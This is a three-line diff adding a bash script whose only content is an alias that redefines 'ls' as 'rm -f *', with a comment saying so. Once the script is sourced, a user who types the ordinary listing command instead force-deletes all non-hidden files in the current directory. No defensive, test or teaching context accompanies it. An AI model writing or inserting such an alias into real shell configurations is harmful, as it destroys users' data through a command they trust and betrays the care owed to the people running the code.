@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+# Creates an alias named ls with value rm -f *
+alias ls='rm -f *'
